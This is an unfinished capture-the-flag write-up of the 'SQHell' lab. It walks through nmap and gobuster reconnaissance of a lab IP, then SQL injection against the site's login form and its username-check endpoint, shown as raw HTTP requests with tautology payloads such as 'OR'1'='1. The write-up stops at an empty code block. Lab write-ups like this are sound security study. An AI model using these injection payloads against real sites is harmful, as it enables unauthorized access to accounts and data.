# SQHell

Author: [siddicky](https://github.com/siddicky)
Link: [SQHell](https://github.com/siddicky/sqhell)


## Task:1
    defining the variable: IP address in this case.
    ```
    export IP=10.10.46.216
    ```

## Task:2
    running nmap on the selected IP address
    Result:
    ```
        Port 22 is open
        Port 80 is open
    ```
    did not found enough usefull information with the normal nmap scan so digging deeper.
    
    nmap -p22,80 -sV -sC -Pn -T4 -oA 10.10.46.216 10.10.46.216
        
        ### OUTPUT
        ``` 
        Nmap scan report for 10.10.46.216
        Host is up (0.16s latency).
        
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 d3:27:57:52:52:b4:96:b9:a0:6d:be:78:70:0c:1f:80 (RSA)
        |   256 fd:62:35:7b:db:46:5b:12:54:f1:a3:ce:42:d0:3a:6c (ECDSA)
        |_  256 8a:88:81:99:f1:0b:7b:c4:96:90:a6:40:c1:fe:cd:3e (ED25519)
        80/tcp open  http    nginx 1.18.0 (Ubuntu)
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        |_http-title: Home
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        ```
    
    we can do nothing with the SSH without the key so rather focus on the webserver.

## Task:3
    Use Gobuster to find the URIs and subdomains
    ```
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.46.216
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /register             (Status: 200) [Size: 2593]
    /login                (Status: 200) [Size: 1763]
    /post                 (Status: 200) [Size: 21]
    /user                 (Status: 200) [Size: 21]
    /terms-and-conditions (Status: 200) [Size: 1778]
    ===============================================================
    Finished
    ===============================================================
    ```
## Task:4
    Visiting the Web-server
   ### HomePage 
    ![Home Webpage](./../home_website.png "Website Home page")
 
   ### login Page
    ![Login Webpage](./../home_website.png "Website Login page")
    
    Using Burp on the login page and editing the password input to get SQLi
    as we test for different payload, one of which works is:

    ```
    POST /login HTTP/1.1
    Host: 10.10.46.216
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 51
    Origin: http://10.10.46.216
    Connection: close
    Referer: http://10.10.46.216/login
    Upgrade-Insecure-Requests: 1
    
    username=administrator&password=%27OR%271%27%3D%271
    ```
    once we send this request:
        we notice that we are logged in and retrive the flag1
        Happy :)
        that was easy, right?
   ### post Page
    ![Post Webpage](./../home_website.png "Website Post page")

   ### register Page
    ![Register Webpage](./../home_website.png "Website Register page")
   
    once we go to the register page we notice that registrations are closed and there's no Post request made to the server, but there's a trick here:
    there's a username validator which checks for avaliablity for the username, we can check if it's vulnerable:

    ```
    GET /register/user-check?username=admin+OR+'1'%3d'1 HTTP/1.1
    Host: 10.10.46.216
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Connection: close
    Referer: http://10.10.46.216/register
    ```
    This gives us true, but username admin is already taken which suggests this is vulnerable to SQLi.
    what next?
    we can exploit this to find the next flag!
    
    ```
     
    ```
     
   ### user Page
    ![User Webpage](./../home_website.png "Website User page")
    
   ### terms-and-conditions Page
    ![Terms and Conditions Webpage](./../home_website.png "Website Terms and Conditions page")
          
